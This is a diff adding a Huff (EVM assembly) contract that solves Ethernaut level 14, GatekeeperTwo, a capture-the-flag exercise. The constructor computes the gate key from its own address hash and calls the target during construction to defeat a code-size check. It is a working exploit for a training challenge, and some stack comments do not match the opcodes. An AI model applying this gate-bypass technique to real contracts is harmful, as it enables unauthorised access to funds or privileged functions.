@@ -1,0 +1,52 @@
+/// @title A hack for level 14 (GatekeeperTwo) of The Ethernaut
+/// @notice SPDX-License-Identifier: MIT
+/// @author unluckyduke7
+
+#define macro CONSTRUCTOR() = takes (0) returns (0) {
+    // mstore selector for callargs
+    __FUNC_SIG("enter(bytes8)")         // [__FUNC_SIG("enter(bytes)")]
+    0xe0                                // [0xe0, __FUNC_SIG("enter(bytes)")]
+    shl                                 // [__FUNC_SIG("enter(bytes)") << 0xe0]
+    0x00                                // [0x00, __FUNC_SIG("enter(bytes)") << 0xe0]
+    mstore                              // []
+
+    // calculate gate key
+    address                             // [address]
+    0x04                                // [0x04, address]
+    mstore                              // []
+    __RIGHTPAD(0xffffffffffffffff)      // [UINT64_MAX]
+    dup1                                // [UINT64_MAX, UINT64_MAX]
+    0x14                                // [0x14, UINT64_MAX, UINT64_MAX]
+    0x10                                // [0x0c, 0x14, UINT64_MAX, UINT64_MAX]
+    sha3                                // [keccak256(abi.encodePacked(address)), UINT64_MAX, UINT64_MAX]
+    and                                 // [keccak256(abi.encodePacked(address)) & UINT64_MAX, UINT64_MAX]
+    xor                                 // [key]
+    0x04                                // [0x04, key]
+    mstore                              // []
+
+    // issue call to gatekeepertwo
+    0x00                                // [0x00]
+    0x00                                // [0x00, 0x00]
+    0x24                                // [0x24, 0x00, 0x00]
+    0x00                                // [0x00, 0x24, 0x00, 0x00]
+    0x00                                // [0x00, 0x00, 0x24, 0x00, 0x00]
+
+    // load instance address which is appended to construction bytecode
+    0x20                                // [0x20, 0x00, 0x00, 0x24, 0x00, 0x00]
+    __codesize(CONSTRUCTOR)             // [__codesize(CONSTRUCTOR), 0x20, 0x00, 0x00, 0x24, 0x00, 0x00]
+    0x24                                // [0x24, __codesize(CONSTRUCTOR), 0x20, 0x00, 0x00, 0x24, 0x00, 0x00]
+    codecopy                            // [0x00, 0x00, 0x24, 0x00, 0x00]
+    0x24                                // [0x24, 0x00, 0x00, 0x24, 0x00, 0x00]
+    mload                               // [instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+
+    // call with remaining gas - 4096
+    gas                                 // [gas, instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+    0x1000                              // [0x1000, gas, instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+    sub                                 // [gas - 0x1000, instance, 0x00, 0x00, 0x24, 0x00, 0x00]
+    call                                // []
+
+    // deploy no code
+    0x00 0x00 return
+}
+
+#define macro MAIN() = takes (0) returns (0) {}
